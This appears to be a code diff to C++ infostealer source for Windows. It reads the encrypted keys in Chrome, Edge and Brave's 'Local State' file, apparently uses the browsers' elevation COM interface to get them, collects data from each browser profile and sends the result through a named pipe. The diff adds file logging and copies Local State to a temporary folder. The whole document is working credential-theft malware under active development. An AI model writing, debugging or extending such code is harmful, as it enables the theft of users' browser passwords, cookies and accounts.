@@ -1,6 +1,8 @@
 #include <windows.h>
 #include <wincrypt.h>
 #include <bcrypt.h>
+#include <cwctype>
+#include <cstring>
 #include <iostream>
 #include <vector>
 #include <string>
@@ -13,6 +15,14 @@
 
 using json = nlohmann::json;
 namespace fs = std::filesystem;
+
+void log_to_file(const std::string& msg) {
+    char* user_profile = getenv("USERPROFILE");
+    if (user_profile) {
+        std::ofstream log(fs::path(user_profile) / "Desktop" / "extractor_log.txt", std::ios::app);
+        log << msg << std::endl;
+    }
+}
 
 // Forward declarations for COM interfaces
 typedef struct IElevator IElevator;
@@ -178,19 +188,27 @@ std::string base64_decode(const std::string& in) {
 }
 
 void do_work() {
+    try {
     Browser browser = get_browser();
     char* user_profile_env = getenv("USERPROFILE");
     if (!user_profile_env) return;
     fs::path user_profile(user_profile_env);
     fs::path data_path;
 
-    if (browser == Browser::Chrome) data_path = user_profile / "AppData/Local/Google/Chrome/User Data";
-    else if (browser == Browser::Edge) data_path = user_profile / "AppData/Local/Microsoft/Edge/User Data";
-    else data_path = user_profile / "AppData/Local/BraveSoftware/Brave-Browser/User Data";
+    if (browser == Browser::Chrome) { data_path = user_profile / "AppData/Local/Google/Chrome/User Data"; log_to_file("Browser: Chrome"); }
+    else if (browser == Browser::Edge) { data_path = user_profile / "AppData/Local/Microsoft/Edge/User Data"; log_to_file("Browser: Edge"); }
+    else { data_path = user_profile / "AppData/Local/BraveSoftware/Brave-Browser/User Data"; log_to_file("Browser: Brave"); }
+
+    fs::path temp_dir = user_profile / "AppData/Local/Temp/chrome_db";
+    fs::create_directories(temp_dir);
 
     std::vector<BYTE> v10_key, v20_key;
-    std::ifstream local_state_file(data_path / "Local State");
-    if (local_state_file.is_open()) {
+    fs::path local_state_path = data_path / "Local State";
+    fs::path temp_local_state = temp_dir / "Local State.tmp";
+
+    if (fs::exists(local_state_path)) {
+        fs::copy_file(local_state_path, temp_local_state, fs::copy_options::overwrite_existing);
+        std::ifstream local_state_file(temp_local_state);
         json j;
         local_state_file >> j;
         if (j.contains("os_crypt") && j["os_crypt"].contains("encrypted_key")) {
@@ -223,8 +241,6 @@ void do_work() {
     }
 
     json collected = json::array();
-    fs::path temp_dir = user_profile / "AppData/Local/Temp/chrome_db";
-    fs::create_directories(temp_dir);
 
     for (auto& profile : profiles) {
         fs::path p_path = data_path / profile;
@@ -336,7 +352,10 @@ void do_work() {
             }
         }
         collected.push_back(p_data);
+        log_to_file("Finished profile: " + profile);
     }
+
+    log_to_file("Extraction complete, sending to pipe...");
 
     HANDLE h_pipe = INVALID_HANDLE_VALUE;
     for (int i = 0; i < 30; i++) {
@@ -350,6 +369,12 @@ void do_work() {
         DWORD written;
         WriteFile(h_pipe, s.data(), (DWORD)s.size(), &written, NULL);
         CloseHandle(h_pipe);
+        log_to_file("Data sent successfully");
+    } else {
+        log_to_file("Failed to connect to pipe");
+    }
+    } catch (std::exception& e) {
+        log_to_file("Error: " + std::string(e.what()));
     }
 }
 
